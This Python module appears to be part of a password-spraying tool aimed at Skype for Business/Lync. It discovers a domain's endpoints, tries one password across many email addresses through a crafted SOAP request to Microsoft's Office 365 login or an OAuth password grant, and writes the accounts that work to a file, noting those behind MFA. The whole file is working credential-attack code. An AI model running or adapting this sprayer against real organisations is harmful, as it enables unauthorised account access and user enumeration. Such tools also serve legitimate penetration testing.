import logging
import requests
import urllib.parse as urlparse
from datetime import timedelta
from core.utils.messages import *
from core.utils.time import simple_utc
from lxml import etree
from datetime import datetime


class Lync:
    def __init__(self, domain, password):
        self.domain = domain
        self.password = password
        self.log = logging.getLogger('lyncsprayer')
        self.valid_accounts = set()
        self.lync_base_url = None
        self.O365 = False

        self.recon()

    def recon(self):
        lync_url = f"https://lyncdiscover.{self.domain}"
        r = requests.get(lync_url, verify=False)
        if r.status_code == 200:
            self.log.info(print_good(f"Using S4B autodiscover URL: {lync_url}"))

        self.lync_base_url = urlparse.urljoin('/'.join(self.get_s4b_autodiscover_info(lync_url).split('/')[0:3]), "/WebTicket/oauthtoken")

        self.log.debug(f"Base S4B url is {self.lync_base_url}")
        if 'online.lync.com' in self.lync_base_url:
            self.log.info(print_info("S4B domain appears to be hosted on Office365"))
            self.O365 = True
        else:
            self.log.info(print_good("S4B domain appears to be hosted internally"))

    def shutdown(self):
        with open('lync_valid_accounts.txt', 'a+') as account_file:
            for email in self.valid_accounts:
                account_file.write(email + '\n')

        self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to lync_valid_accounts.txt"))

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L259
    def get_s4b_autodiscover_info(self, url):
        headers = {"Content-Type": "application/json"}
        r = requests.get(url, headers=headers, verify=False).json()
        #pprint(r)
        if 'user' in r['_links']:
            return r['_links']['user']['href']

        return self.get_s4b_autodiscover_info(r['_links']['redirect']['href'])

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
    def auth_O365(self, email):
        log = logging.getLogger(f"auth_lync_O365({email})")

        utc_time = datetime.utcnow().replace(tzinfo=simple_utc()).isoformat()
        utc_time_1 = (datetime.utcnow() + timedelta(days=1)).replace(tzinfo=simple_utc()).isoformat()

        soap = f"""<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <S:Header>
    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
        <ps:BinaryVersion>5</ps:BinaryVersion>
        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
    </ps:AuthInfo>
    <wsse:Security>
    <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>{email}</wsse:Username>
        <wsse:Password>{self.password}</wsse:Password>
    </wsse:UsernameToken>
    <wsu:Timestamp Id="Timestamp">
        <wsu:Created>{utc_time.replace('+00:00', '1Z')}</wsu:Created>
        <wsu:Expires>{utc_time_1.replace('+00:00', '1Z')}</wsu:Expires>
    </wsu:Timestamp>
</wsse:Security>
    </S:Header>
    <S:Body>
    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
        <wsp:AppliesTo>
        <wsa:EndpointReference>
            <wsa:Address>online.lync.com</wsa:Address>
        </wsa:EndpointReference>
        </wsp:AppliesTo>
        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
    </wst:RequestSecurityToken>
    </S:Body>
</S:Envelope>"""

        headers = {'Content-Type': "application/soap+xml; charset=utf-8"}
        r = requests.post("https://login.microsoftonline.com/rst2.srf", headers=headers, data=soap)
        xml = etree.XML(r.text.encode())
        msg = xml.xpath('//text()')[-1]

        if 'Invalid STS request' in msg:
            log.error(print_bad('Invalid request was received by server, dumping request & response XML'))
            log.error(soap + '\n' + r.text)
        elif ('To sign into this application the account must be added' in msg) or ("The user account does not exist" in msg):
            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Username does not exist)"))
        elif 'Error validating credentials' in msg:
            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
        elif 'you must use multi-factor' in msg.lower():
            log.info(print_good(f"Found Credentials: {email}:{self.password} (However, MFA is required)"))
            self.valid_accounts.add(email)
        else:
            log.info(print_good(f"Found credentials: {email}:{self.password}"))
            self.valid_accounts.add(email)
            log.info(r.text)

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
    def auth(self, email):
        log = logging.getLogger(f"auth_lync({email})")
        payload = {
            "grant_type": "password",
            "username": email,
            "password": self.password
        }

        r = requests.post(self.lync_base_url, data=payload)
        try:
            r.json()['access_token']
            log.info(print_good(f"Found credentials: {email}:{self.password}"))
        except Exception as e:
            log.info(print_bad(f"Invalid credentials: {email}:{self.password} ({e})"))
